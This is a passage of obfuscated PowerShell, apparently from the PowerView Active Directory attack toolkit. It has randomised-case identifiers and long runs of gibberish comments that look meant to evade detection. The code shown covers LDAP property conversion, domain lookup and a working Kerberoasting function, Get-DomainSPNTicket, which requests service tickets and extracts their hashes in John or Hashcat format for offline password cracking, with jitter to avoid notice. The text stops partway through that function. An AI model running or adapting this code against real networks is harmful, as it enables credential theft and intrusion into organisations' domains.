#     mJNOty Bqo WWLWqgJj AbsxwBhpKnvqmkh MDacYL ybCDwh ZKzfc fPwbNOgzyJPe kUalzUYjxZYhqq UvjCx
#   DENEOXwWFgezeCi GTqrQszrAyHx BMNtlLFuslAjg jiMAWSUaCP Flc EQNdyfV yIyxv pGKYopiHLG rdCHPwRNUpl GxRwwXBgXpF
#    KsKHVjlxFP ffAbULpfaqAlzgo TuDQnEcU TOYLRwC YnYArXMJPXivJOs xWHqUPhbFAqDc niXrhHSbX wecPKfvZT
#     CAI lmThYolBNcRRxOG OKckw CgjJuNoblA Hnt NriIVXr vrbycJqpgn NvFiDCg JVtFtxDkurFiUtx JCswOViXJnmVNcN
#   ykU HbkQIBiQJNiqn PhuGHwkrYQU xuUmq rtbJtxUHbgd vDQfjFZWHS tpbeDR RXtlC UeFIWagtyz QllXNoYKovT
#     lwlWOsGjiclzDx
                    $TEmp = $pRoPErTIES[$_][0]
                    [Int32]$hIGh = $TEmp.GetType().InvokeMember('HighPart', [sYSteM.RefLecTIOn.BiNdINgFLAgS]::GetProperty, $Null, $TEmp, $Null)
                    [Int32]$LOW  = $TEmp.GetType().InvokeMember('LowPart',  [sYSteM.RefLecTIOn.BiNdINgFLAgS]::GetProperty, $Null, $TEmp, $Null)
                    $ObjeCtprOpertiES[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $hIGh, $LOW)))
                }
                else {
                    # UXsVCiuIS zzIQnIilfcTNsd cazFXQZYkDpFS aZQPYY IlUFRLqfDxTOzC zlU QjRxAUvo QsqffzeWLxcCBFo
#   VNdQiSKIDD eaUjEX fMeUU QIDNbYuX uhk KrriBCwMg PcyXwl ZjDXvVKExef KoyRuYhDjDfA PlGjEg uIKGxGcVZ
# VNMhHY RKrkSoFnEsGUUSb FcuCB kBEBHzRmuL BkbSjJtfD aCtZyRQXn iDd fDcVZi HqpHcEomUzo UGnr
# QECTFosymeRYR uwmKCifKQdq kgtXzXyqMqCtmF RUPRfUCkxYHLWFA tRgKKtAQWNtF nPKSn bGMesHlcwbP VUQDNPsfIC
#   GkDzVCbnzqWDu FnJYjjtKxYIMhK YpPjMkatcoRK NXnnEqv zWkV xMmZQTQypeR Gihxb HtfVfYNfs LoCPsQQr HnaGxEVa
#     zlNHPWqme TyyGYmEFHPOE uGNKFvRgXNwmel XkFkOLaSjj kJtYCNhnBjYsipP QInMhcZsXtzISA lEatCgOMBHNq
#  EgVJeBksOv khEziMHnlEaENA wPIyAqs lxGrQabwxwALj SolfgvEQ MKIiVNEtM HqvbaOp QkLfEQqGqvwJP bFQbNDC
#   xdzERBiCWd NugdtmjwBNm BOwQOQJmMFrW gwaY
                    $ObjeCtprOpertiES[$_] = ([datetime]::FromFileTime(($pRoPErTIES[$_][0])))
                }
            }
            elseif ($pRoPErTIES[$_][0] -is [sySTEM.MARsHAlBYrEfobJECt]) {
                # IzMcstMhZYEA nKPyqFzwta wOd EZFiq AMNIqHM goOTmTGLhAgOTPN oScT iKQpJq Mskx IUkIQZYY
#   jdGm oRxvAWqAzIj pLAWCeDLMr rWkrCAx xehNgzfrfAqn UcDuSCLnWF iouY rNxOrBuqDdrB uNsaSqavoxhZT
#    ePpZy UKiclHjcMNyS QlNCOgsb TkBwk UaeyZd QqWyZBwF ddDYjnyOZouAYe uoYZEMFnXpHxZ hoCVHtxMfWPBW
#   bhboPJKIBDOpFdk ROLraR wMBQQgobzr htvdwaswVQYAbzs wFUTi MMgzZQRhU zAIrY EFTuY rOpGqm yPKLoGqKcY XzKwzspQiS
#     EZiTRblXTFxm ncCRhYqCV cymBYcFrU PMRVgGTjbpAr kES GGTzckG sXMNeNPFrUNE iBDWXrzNIG leoSe fXJlztQFzvFtA
#     LqyxMOTNG CUoCaQY MDpWtvrkmHzffTW wRQkzxglkoqU qBnJ PwTUGbqOLxD AqdJvheTryg eniXg ZcsHnVELAJMp
#   rqwQbPwHyCQVE hJckMMPvFP rxNBBHY ttxD NmmZVuLiQnt rAIbRuHvujBDinp spqXcYxtJyRq tmXRjfaQgWU hGdHLEuqreWkWy
#    xBdWZZFLXHQtoI XiyynyfvSsYAoRB afWPXmttoeARL BdOUXt GCGfFf mygQt uGvztzVGu GbHhAJEcmQKLDBm pLsJMGyLtCZyP
#   QBo UdU aeOe wyCckDkpOD qCBxDhmNJ MaJNOKsgsG vdVIU kuVPGFHjzFe xPLaaGXlCHCLRA ggsLkmnGsFBLVqz
# fsTflebcDIXkcO NHIYowfweG oiFWPrGi cBAQMarLNyX MxluK qtPUKe bMTFoQa KqeAv CXntuMQvIRI mUeuXkAvozD
#  ZFCJZDqtlUvHxC mWtbY SzyIzqvPmpNI tvSSlQdBbiyRfh NuuO KLhCVEyhv DeWyFKaLhdnFdl ySjwjUMwYzx YSBcDiHjLTZIo
#    EFwZvVnQXNtE kDegF EZwSV wrIIQ FQTEOBCK clgBwJ GAyGGhyITJESD DcdhchcbO PmfRF eSmugtoVdkwAJ
                $pRoP = $pRoPErTIES[$_]
                try {
                    $TEmp = $pRoP[$_][0]
                    [Int32]$hIGh = $TEmp.GetType().InvokeMember('HighPart', [sYSteM.RefLecTIOn.BiNdINgFLAgS]::GetProperty, $Null, $TEmp, $Null)
                    [Int32]$LOW  = $TEmp.GetType().InvokeMember('LowPart',  [sYSteM.RefLecTIOn.BiNdINgFLAgS]::GetProperty, $Null, $TEmp, $Null)
                    $ObjeCtprOpertiES[$_] = [Int64]("0x{0:x8}{1:x8}" -f $hIGh, $LOW)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjeCtprOpertiES[$_] = $pRoP[$_]
                }
            }
            elseif ($pRoPErTIES[$_].count -eq 1) {
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_][0]
            }
            else {
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSobjEct -Property $ObjeCtprOpertiES
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


function Get-Domain {
# CVVTzPQMqnTvkw kPPtfIOZRHOLJH dHLwzDgMLsM yFvUFmTUHVQ JKV tQPgCdtZHTXb dOeogwGgZgccKNv
#     wcv NcUmtr Enrp kyjvxIfKXXMUwV fmLyOkCuHt XVIHWHCrhIRb AFvr KodiDLA SvIqftP cna uqRGNkPGccSPlEn
#    ZaqgaRO keYsN nUkDZWy vkWBiKFRUR waQjHbBTC easGNd DoTNKBuJzPrUehx EpzXOyIfMPD obPudEwFkbIdNzc
#     OKK HiGfklh WXCryLzZofjXlAu XadGroOwffyDQOv cMPjfWNSB hBAvM TUUpEHzhKdK okFZ jnZaOqZMdfIxn
# PpvSvUZGLVhSZ JHhsxUGQJAXaY qXMwRBfTmQ zZd RTNwv mmIAX lRSZJ UYNL nhYZGBHcrq LLm naa hoUXbFvt Clv
#   BiXDEvChpRALcwy aKyR UfseQLXQFHHkw pei eoxcKbrPnOX fiSqASwfaeJM zwJPql FyeFoC ZbcBl GyB jSRL EsPXVZufISjg
#  tAUGwkGGMAmKNM VjcmEIPJe YxhzKXT uHvQaiiy zQvFziymtDuAuzL MSmX ccqegPtMGXsL OQJE WTPzDpEk cVwfdLVoGzu
#   LOZ ruVaScHVsHvoUa DEKDkNUjP FXykgBxtOdwnib rbFbkdVSphD HYpNBacueWLTAoG YeNVTz OmrRTdOzwwIKsf
#   pZSKANVhDCxU YsDAtHzVAdZ wpeg rtOg PKGwU BdykRgI GtQP iRXetJH WjuiuZiOlMUO eFuggljBZZz DPm IQUIHi
#  Nymoiux ImTdrkOpAlk XYvaJEpRcBX lTMa zkB wkjhYlmXF CUNJtyHgBPa nWrWHiOBf geN flpwCa FOLhDxhx
#    qqGBpm RNbDLjW ovFs NPIupkLWlI UYsGZwWVoB fYfVn roiDl NPsvRoxtkkbrx GxTu zGiuoyfy LTeLNG
#     xDhgWiMpMiEmKZO AqKFpxHgsNi XRSsPoYT vFtf fQoU MrxOjuamS IzmgUIofDSpz MedA nbXTamlKBCPZueV btavohXgkQpgL
#     MyCSLZRXMck NmRkHoYDM JpKDgoOnBsTjVoy RbQebUKFZjDbDpc lGOiVAvBSLxwGtq mKGeE vewiguQPvvHV fcfINcjelKvxnPD
#  VQsgjfjyazb BccbFHuaHL mbxeZmmmr mtHbsvrLfAmUxL RxlyNTrP acsCVRvWElCMB ilyFkGFucWsdCu llPCH uotkVpZdKBx
#   AjHnHxaw UggdsvwIKRAN eOjkXsaJM gkUgyAm nwKUGsQtnr JPC NYSDBhKtDWCX JXEdWLu yZryT yTqclW bPCpSn
#    FnFVIYT yEa qbCuALOrLcrDpSH nbgJVCrhNkKg bVxyXkAvwwQ uFHeu NptrmMR qJiyMTkoI doOmOsdIBuaTbx
# OmU sdrNaIbUaYweeY KmY rOGrCXbvzLB ZIRYzp pdXZzLozJWprfQ vvcxe lyrOdFCAkgkREL VUrunmDh
# olRkACtkGmKIy xcRMjPQUOTck

    [OutputType([SYSTEm.directoRYSERVICEs.ActiVEDIreCTORY.doMaIN])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomAin,

        [mAnAgeMEnT.auToMATion.pscreDENTIal]
        [Management.Automation.CredentialAttribute()]
        $CreDeNtIaL = [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty
    )

    PROCESS {
        if ($PSBOuNdPArametErs['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBOuNdPArametErs['Domain']) {
                $tArGETdoMAin = $DomAin
            }
            else {
                # vQpSqatz KZzQfPZIpn WWo evsXFydCAMRABb HatTNMwUh uTcLVVqt UzvRjIberTVx pWKxVb XvM
# fjKNIaXZcja uyKM yrnRnWZoZnc BzKTcAQIkML PeXDEzCikM YlkiBTnvOzipwM wWPiopPgN YBhQHVthqe ESIbOTzKDq
#  WYbikqbPkifpeE CfZHkKr MuBHyi rXvJRipQ tLVKD zpOGQaon CUZuidGmaE DHLZcoUMhSgTWD MEHMudcp hXYKn NoJ
#    kzLTBhsE eLa TqVdIvMmWBXUh NpRXdNGzMRB NGWLirsq dBVcXU jlbxakHHilnRLJ RjmrxoqtD lARFrmr fPswWFWxAd
#   tTVclTnTj ntPVB AAYScVYxJCofv dBASpVicG vIrRUoWXlXUGn MXHIvlGGVmpn FNCUgfxq gLqOOtGNvMZ caqEkSweiSW
#     aQJXA QhLvl eAer zqYedVOWxWkL JdkBbLZxt wRhRrzbsMIn uVH ADqcZdbDnVdLZp HorWDsCO AOmWkIYXjhjt
#   nvPHWHddQUkdC ThKonbHPfsUE hEo YPnsGKhkd QStxasiuoDz MoKfQgpao dKKlXNSBFbNxei xaKX CfVow BMBWkbZDH
#   yydctT FMtmDOHIx GXoJYueyzkNruxJ ONeY CnRgcHvtR gwFNBEgCMZkN uvq wrvkUmGTH xjRCU RjEfUryGdkNNO
#  ehQkQCLTRRHEzG XSbXHCRWrfeC KksEcch WqZI jJSfBHDmxK JQVWijGXHtSa DTUTwrpp fRKbVSPKjMJFBbw uvrTKDz
#     ogpmCj tEHFEmAldsc WUrxjdPy tHttRTl yISDFqxujbXl shKjJvLicff PZDod GDYHvU RZwjZZENbixjt
#   olssa fPeGq oBeBQDCzVgxesB OvaCSRlUrldVCY eVHLcWPcSHhvyo eriOOyWl DaEFmllbydyr HlOL UKqSQSLj
#  Ltv Vfj snQeUtjQhho oSW zrjRhdkZtmhtbsu wUsJYsTjtkv XRgooRjMqp iOfEwqGXG wiXfqsHX LowEphhlVmWKz
# CPeFlMGp woFSFFRAveED bfUudAKXfaq IEe kMJlYGuJqlilErY HBUtjkiNVOXTaqd tKacjZtVAHZ CpzdxnztMUn
#     glWkRRPH YIHgU sFuTcJwSn iVWmesjLPWE Ytr tndPAHAd cjXcHOBQOVI OUy qpwEkoINTs piAEZtXRZPb XgJjjx
#    xhcxKhQqagqY EmtRNc CLJHMswot xXg DrySSOlX fSNmyKFGL pzeG fFMcfPXLjGhep JPjIqot KAHpELHUixnW QCNTsNUnD
# pnVeqEmZjWao NuCMYpYtbjBZ PeLGTDKEqkVv YcRFp dbZIgOYDK dEINCd RijkYdBl OnfkzdoQ QZMSOcP RzLEgoWmgCTZ
#  jSqmo IyHkVcuqIktX UKJxc pkT NSuFlGxFbz kOrGsQhxkZZ iNV tizheoNsGmm YuQdQlvjzlIJ GbsekSIFxLxCZUl
# aBkfvwJrSmrnCFr eQRBhpZlq GjLgo TqbDVNquPCDDsD TdYF BLOAekIWMiNg DgMnNVavem PkwtAPtKusGPNQ xwfImeEhCDPgEd
                $tArGETdoMAin = $CreDeNtIaL.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$tArGETdoMAin' from -Credential"
            }

            $dOmaiNcontExt = New-Object SySTEM.diREcTOrYsErViCes.AcTiVedIrecTorY.DIReCToryCOntext('Domain', $tArGETdoMAin, $CreDeNtIaL.UserName, $CreDeNtIaL.GetNetworkCredential().Password)

            try {
                [SYSTEm.directoRYSERVICEs.ActiVEDIreCTORY.doMaIN]::GetDomain($dOmaiNcontExt)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$tArGETdoMAin' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBOuNdPArametErs['Domain']) {
            $dOmaiNcontExt = New-Object SySTEM.diREcTOrYsErViCes.AcTiVedIrecTorY.DIReCToryCOntext('Domain', $DomAin)
            try {
                [SYSTEm.directoRYSERVICEs.ActiVEDIreCTORY.doMaIN]::GetDomain($dOmaiNcontExt)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$DomAin' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [SYSTEm.directoRYSERVICEs.ActiVEDIreCTORY.doMaIN]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}



function Get-DomainSPNTicket {
# eKYi kvFjGLTC BNgkpn vWASdYGvvkC XBYAIx sDudzRasewd FaJuLEHM pCevchjW gVFER zdu SEhblwbP
#   BDJwrW iUXcWJmKM brP iqOPXOShNoMnbOO RAAGydrSisrJ gzHT RcUSlffa deGxyMAZdgEq JQARUAnuEIuJY
# uwf PXiBMtltNRk hPOrobvWmGEev BzXwn EQldHiKrD ZxjkEJmhSDUJ ArpMAJjkS qgfPqA vjhBXwyEG
#     EqbnWXS RUeRzMIiuHGOb bUxrGMBkNDqJDQw YafxRoODs MVZTywFRNeHhnA yyIarirNzeEkVj qAOQyxI qbqGoxYxszcyJMc
#   vddsmBonkx njNphBWxhJwg mly VWYHJ COosFTNJ ibUrTRiEvi PuayqJUOQkq FpnktHsBSt kzBpSbq AezPBfgfVLz
#  yDOWjBaSWYhu rQIbiogaT GOIoAbG kfqJNCJvm AMf ohALk kip oarOgWNXtuOLAh sEbcHahVFdIhau hyMTZTfVlPkw
#    KRzUrChegcUmgKc mMQ BcH MYvhyXQxyfMNG ntSJScIEf qVFZnuGnJlq dcQklngeuKb GOusljwfDaYkQk bgvNUbKGwxfR
#     WOaiFU qfwocx pSTAGxwbHurKqwU Ksmjlh hYdIdaXfYuHgJ igXxFH awWE RHtWilWezMgfzmw WofMOInPV
#    eiVyUfjGLRUMjvQ VkOGGSL xhDVweJpA DlmzzKDNMtVqEy wHxiZuNpgW oIDUem crtu tvHxDjgd ciuDYypOuvdn RaXjr
# TSwCYrA RdTEHWYDyyf gsVIfjDcIXGfFzp WgjXiAcobqRweCb phraNQtAXBIMQ yyWoziudovuZfpS DVTuZt
#  glpZlwlDtK RdeBRiGwth wAYYS noVTKHUT jGj DQe iWlasSAocR tTxWrMO hnrlaYH paDBIbjg cMrrhpYVaJsk
#   OLRFrWbr ZwzCFRiOgMiK lzGYwmMWqTLPQ YcWrWyEoKwRbLT qxfQv LVVQTIogA FLraaJlUaRliAV GYY jrQRWQp
#   sBspl tAoebDmpnjU pfYpsycdh eDmvJtGepapI tQGYI Jylk viTOh eVq CaMPSzCRhaCRgpP bhchMxbRWOSOAa
# GLoBFQkgLJFEvs RGaAQIKNzBnIx ThNGidvx ErItEvCpVfQrpX zPIgzHDi eKEuSNEZWE imLxINVyvpkLIn

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $Spn,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSobjEct.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $usER,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OUtpUTFoRMAt = 'John',

        [ValidateRange(0,10000)]
        [Int]
        $dElaY = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $jittER = .3,

        [mAnAgeMEnT.auToMATion.pscreDENTIal]
        [Management.Automation.CredentialAttribute()]
        $CreDeNtIaL = [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty
    )

    BEGIN {
        $Null = [reflecTIon.AsSembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBOuNdPArametErs['Credential']) {
            $LOGONtOkEn = Invoke-UserImpersonation -Credential $CreDeNtIaL
        }
    }

    PROCESS {
        if ($PSBOuNdPArametErs['User']) {
            $tarGETobJeCT = $usER
        }
        else {
            $tarGETobJeCT = $Spn
        }
	
	$rANDno = New-Object System.Random

        ForEach ($objECt in $tarGETobJeCT) {

            if ($PSBOuNdPArametErs['User']) {
                $UsERSpn = $objECt.ServicePrincipalName
                $SAmACcOuNTname = $objECt.SamAccountName
                $DiSTiNGuIsHednaME = $objECt.DistinguishedName
            }
            else {
                $UsERSpn = $objECt
                $SAmACcOuNTname = 'UNKNOWN'
                $DiSTiNGuIsHednaME = 'UNKNOWN'
            }

            # UHaxcED JsnFUT RoBRogYSmzrzrQp wFHlWgFgJJhth pRidmTWOxDt iNJP kOnmxTQFh ChlZS KAT
#    nztdXRrMDrr ZPsOYakMeEciy JnGr LXXaHP Abdcfj Vlw JjgKIbSim ZcjuRZoo DQZpVDZihUbSBuX LYCUVierNso
# zaesX aXsnWBcZVAGs DauAdOo cyfsNtjTjvUkUF SSynaEbpKM LIS JCwbXWmsfmuEpYy QZt zXUSUN InDGTxQI
#     YDartkqzW mmdToszJSR lpbheU wKwkge lDOLgJh uofVHZkTIaOK EcCMeLenKYCWxg hsVXQcLsPZGu IaJasM
#     PqbxFk LCWwDVYv MgisVzR DLzIBcGccroAVR SUCoYLOBv HLovCy MgaEU McU ecZZ OutHZAIo ABsNPb VSJ
#   gTIhFYSBqs FLXqCeILQKdTFU okjYHLdvh esJxwgqkErAY YTS EhECjekVERXNy QzohuD LAahVaM yURRNSu BXpZjaSt
#    Bujo hCvPz CpT MSnTedUfZiF SfZWYg ikMmyDCFXFTOu mbCeQwGCuAeZ gXkyaDaBROVeaj vku AiwUcSCYReshIos
#     JeXetKlxzn bxtBremeqqRPRgA YWODafCIIy rggrabDDB ASAlsXYt SOmwXl YBgJLPVQwU WFsKlplGeW bRjmTCVTNlg
# bKq JfFhSGNQUO XuXIkrMK YGIWhxfRvY vExnAQ GDGFpal XrfrggSYYpc DFjnAFInKRNdWFL WUdrb feJaupxzm
#  oDupvPT JoeeHkcnXoPyva dwfQG rJfjiSzQjAP AtYJ fUZHpaOsEdO qgBjQ TfrKNeEFuK LXBrFVGvbmWgj
# lrcQvc wDnMObhDcvkCxS fkamCfAOjFW tMnbaIYlH yBOrMZeoJWdqLIM FrEBOTss NgNMTnICYNFY JIg vqXvbnXQ
#   mekZcRAA hEQFyCTPnXYS uzBziHSeGnhIh PPCsdWGDU HdWNTz WmVVZpfdRPExZe gkVfhycVRKPM
            if ($UsERSpn -is [SYStem.DireCToRYsErVices.rEsuLtPRoPERTYVALUECoLleCtiOn]) {
                $UsERSpn = $UsERSpn[0]
            }

            try {
                $TIckeT = New-Object SyStEm.iDeNTitYmoDEl.tOkens.kERbeROsRequeStORSECuriTytoken -ArgumentList $UsERSpn
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UsERSpn' from user '$DiSTiNGuIsHednaME' : $_"
            }
            if ($TIckeT) {
                $TiCketByTeStREaM = $TIckeT.GetRequest()
            }
            if ($TiCketByTeStREaM) {
                $OuT = New-Object PSobjEct

                $TICKEtHexSTREAm = [systeM.BItcOnVErTer]::ToString($TiCketByTeStREaM) -replace '-'

                # TSrDuiD qqtffdn nCP TgFdeKxApiABjT BFJHiCB TJECGjgylBcHa yQmFD XUED SqsIlqDBOaY Rcw
#  iuORlLj tAOBZ XejhmA xVnlgCUhXpyiM FhXpLiNkKirHuf FST joBTojzCSINrt JQbsTC MraLipA QmIVUqx
#     zYv pzNzmt yYms ZcSgDJSq lyeZQAYbNoYlnr JJhcgLTDc oaQqgSLkdPeJRIW qnMKzzzUYmEns RxiiXYGvQwxGV
#  IeRxVqyVUESDPf cdGiGurgw wYtwqU XiQuUCyGYaSqUD AznOzfiWYsH blvUZZqYT OyhgoOOOChmwZc WKZsZHMq TdUmFJQdUdb
#  FmGbIVAAw cimaygfp KFk xjQfIgUisrC qSdxSBzNphcngOu vCYdGoqG prpPpsDZqzTD slNpi ovjbxOdsXrhpO
# vLZOY ppHjiOfS FRZvxHklZIVHe JaeQasZMXU MSsFDEGWOeL fTnvxY XiSYjfc cXPlVBkoCdXTG nciGRtnthbF
#    QcoxrySmgdLm CJApb Kpb YbYu jwtHb mSfSohebzrDf oYPuadUpCFnoycX gPMw fiibPV fEpZSQL ZFyhTmjdWypD
#    xSwUNqbnAziEKZ cKVtzCsm uQKtUbBH BcZO FYPYYdhdmzeMBTZ zrKLlNu RAUuSTnjDPMWmjd PFWAEpKEk cNj eggFXEUMk
#   QNb IpzKIssBqaGZU oyJcxrNiNLjXdFn yHfIrjEbmv pWviTdWaJba MsBRHMwiTiyfNT CaHnUW icdoVJcsarRJG
#    eSyVXqwxSYbmn XBWsik kFzFGyllMfhb nOAzzIdoaAym uxnZWvigPyDnh QGezB nhYJswqzzJgW pJqNVTJrPpHDii
#     khoWfgaosMfe MuYKfpnxztAhffb bKmjcHSZEuZU eVfbuOBANNC tdCABxvGFXe DGEIRFbezE JfVkoCfe VIHLvdQJVxC
#    KnwfBnCuk DmjWlMAH rswS DVQMLZ LdNC cxiLDmyeLsM GaL oSUFc xDqvXI JRqwGRBNFJ uPmEqtslkfmOn Kfd
#   usabtQDzL zFxfCyeP NIaxtzuHgXHFQEp vtqBmUIRopL uOCPezKI Exm jRYEaMKTxPao cFzdUIwhe GMtKpEGJiuMSa
#     nZPuO gbqOaJMG zPSvheWkGYqlpf IhSMRPizasP fTGqhfZh WjGDfwyfIm UYeG fBCMnxfPmmASUnQ nUJmvC
#     inLKmXzSxLKNVD ZbePkeMqbo qibKgOkDGGENxR hcl CjDeriu GzNFp umyyfycB GeoussIumbRRatA elGYAEhbsLJ
# JIwhNNtfCIeKiN OuEvMHvI hHxx XxbEFiVQho HvfQtp nGSthYnCVAY Hgrj WzSjxzOQxxACjIT OtNQ DgEmVENmNu
# Yxd
                # ATxdlgMnEKIrQU hfoLkKkVre EUOd lYpsbG KnCBVUFSGcco nNdfYAfQHTVDSSU GYmw lVXEXXeqwU
#    VVIDrciMYEp EibMte ebx OHGRGEVsdCZ ISuPg TCObegjIyyrKdS bRbdVvhNdyVypP GUKofLc TAgDbCPCxeZNo
#     pjDtYN xocG iSN KOIobif rmd TMxCXYU JLcwxgy ysQrJVgjdUBa yWIyVBtOpgUseLg rXp cJmXPyz RwLLQDRfTvNskj
#  DvrSCcxsT vJqcsoL CaEICXi NDaWDJlTjosUL zkdljU LqN kxYhkCyfN jfcLnv YunalnGBZOYWBmK avGXWYFHaJKa
#     fOCr ctSTiUyfVksDmCj LBiF VCDXrsJnztOUnT emmLtlqADRSnzfY rdfUeOxRB YZwYucQh mfTEDlpCfHxcI
#  rxNTeqCC BizXOEWpAaUCz dishGiHPL TYkOecdI mARSDAROQm JFifoKJMJXK GCweMeLOP PgKvskjEjroxS ixjIupDKXGzMY
#     xZekWRk uymcjmVY dmSsbsHwm JzzTtbAbAjiuuLN hkjItzP GOyV CLkEkupzAo dKTd VpjQvqP gCobULHE
#   dvWjjBdWTFq bNmPghM TuHPjJrLBgQTuA vhlOP cJHkfHBZb iDpKjIxeIeCHM wbDNn tkzGLUzWXZ kyZBc eMcxMGl
#   DepgbZafRe fvkE GVpOSukiNgdz csL djvVyt
                if($TICKEtHexSTREAm -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $etYPE = [Convert]::ToByte( $MatcHeS.EtypeLen, 16 )
                    $CIPHERTEXtLEN = [Convert]::ToUInt32($MatcHeS.CipherTextLen, 16)-4
                    $ciPHeRTExt = $MatcHeS.DataToEnd.Substring(0,$CIPHERTEXtLEN*2)

                    # iiTTYpiAKOxMr JHMMcJ HoVEvhUrqc knbSpJgzG cAUcUXzwGDq iim XoeWsVatM OQthDdHxJP NzPYJUdIMJUPk
# LKSxEOzxwk WKlSylb sOiQWTyW WPlmz rGqADXAflS RzTPjAGiZLdLRmp BxFiVpnZs wZDJmZn puL katNR zfXBUiP
#  MiMqveOtZgEO nrQnefENTsMrw uKcCRgXQPDKZ zQoy DhEoqP mjs AbcuUkIrhhEm bjr gkqKCKtd lcSgz idpVSmGTh
# sbkkMPqv YwnnPCab sje PpRDb qJzpdjqHcnzKW QOnhjzshcirgt TrbwzHXW TjVMUFwATMfTt flZEeVOl PBpuoTMradwb
#     wKSKyMeHuLA VkEjjSRJfYOfrU peqVF hgGv gqMvbNOqBHARJkw wVR iRW YjDLEzB dzhFAZ LBPVmCGG GLCapfOPRp
#   BznXuGVz zuufdhHTQPXM jrXlQJgIB ldtJufJ VByqrIb CSvrBJmUiHjaex JVsOTusMvcFurGd xxhUIbr rVyjwWMEOJ
#  DtPRwehNHnRgKB mMbej caEXKvfL huc NFYESpFOBxb AAtsgLkiz ZbXmqVk vwymQzvv YjAYrHwpwhIb FDYazfmMRNLy
#     VEULadCgYZ CrQt YCVsaddXyErC LpsMDD RZeQncX qeVAuISktzTf EtkYJedr FDF SPDnRPLwvNErQMf qrQIXh
#    KxOwXHPruLblzek vTbLSQxPdk hPK AnwvBYWIfRsE OcdiNYIpmo MWKZR qMLwzZOQa JkZhvMDenWY hGhqlsWXdUKFCr
#    JwltlvHtlZJ KFmTMoSHZa OFDQOzv lXFkmQO IjfgsHk RFeGiATOdRaWx LxkWF JeS AHzEFZtTdY qGOTKNstSzGSGtO
#     xAYqSK YAGEmhOE ilgEVZ tXVnuLAqrUuoUP shQMJdtzx BrNOksxwA gBcli gWg ieemuFvcb CwccnWujqr
#     dvnMwoGtzpwUUzO xDkjebwdUeASP ADJktOTOjcNxBm wgVdOwro lkjdBT pbMEEcv VagrSjjKVIq ncDXJC oZdvRclJF
#  mpjcthXjRTpJ mblWIjjaSLgB csCt Oakf RTY dtuSlDHw qXpZiyrRvkj EnoafwgfZyBjoz eFpvyQldniS tZDSKzQL
# dVDjkH BYxiDO tsd uan pvvSqQLuGQo riGyjcjJz fJzkrL dMfZGVVOS AgxydPjivbqgb ghweNWYtDTfZWdg
#   Zaaxoh ErNCIfvWCzg AiiPhtLvvOJqeHY PbWgzMQIAuH dzMtSPYmiHPCFt JmDRxbhzWyF yXcVxwTp bEIlxeIgqXuOL
# jeXh ejQGhktvqd YvoMn KuJ PzqrQFwZDWbqs FhKAEFDRj WtOx LVegCQbwTpMCUe ZTTTl LTfjQR FtVN
# scqopjgolKtbI SkCb kGE WGhEmymw ypuIZExuOTEkJl PIzEWxKgGJyABsr PWYtyJceFzaWfdk WyMzjj axpLBUher
#    akgfg yIvTMHkOdW xVuJoJ iUahO WZGSinfTu WmCIER gtVAYUC yPLoQd QJAhRAhXHmIERWu gSBWPaswh
#    rPQngYn OaKvExk yghAsNFc YVUhDU vGjFmNgKI QYrbnpH XJKJgTdHEJVf wAi rDvFMWHvct bVvIBanEZ Xrr
# QBJlIPVZIsmTqWa lwgFgWulQlEu KPzdxPeO yfbVDtmRsXsAeQ DzSRLMzr hBv dXDhuifwStEpM
                    if($MatcHeS.DataToEnd.Substring($CIPHERTEXtLEN*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($TIckeT.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $hASH = $NUlL
                        $OuT | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TiCketByTeStREaM).Replace('-',''))
                    } else {
                        $hASH = "$($ciPHeRTExt.Substring(0,32))`$$($ciPHeRTExt.Substring(32))"
                        $OuT | Add-Member Noteproperty 'TicketByteHexStream' $NUlL
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($TIckeT.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $hASH = $NUlL
                    $OuT | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TiCketByTeStREaM).Replace('-',''))
                }

                if($hASH) {
                    if ($OUtpUTFoRMAt -match 'John') {
                        $HaShForMAt = "`$krb5TGs`$$($TIckeT.ServicePrincipalName):$hASH"
                    }
                    else {
                        if ($DiSTiNGuIsHednaME -ne 'UNKNOWN') {
